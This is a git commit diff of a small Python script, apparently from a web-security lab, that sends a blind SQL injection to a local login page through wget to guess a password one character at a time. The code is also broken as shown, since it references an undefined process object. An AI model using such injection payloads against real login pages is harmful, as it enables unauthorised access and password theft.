93bbc4dd0ff962dbabb939975ce3cf630ffa0954
Ny4nc4t <>
2019-05-15 18:01:15 +0200

    qw

--- script.py
+++ script.py
@@ -4,7 +4,7 @@ import subprocess
 request = "\"http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' --  \""
 bashCommand = "wget  -q -O - " + request 
 #bashCommand = "echo 'hello' "
-subprocess.call(['wget','-q','-O -',request], capture_output=True)
+subprocess.call(['wget','-q','-O -',request])
 output, error = process.communicate()
 print output
 print error
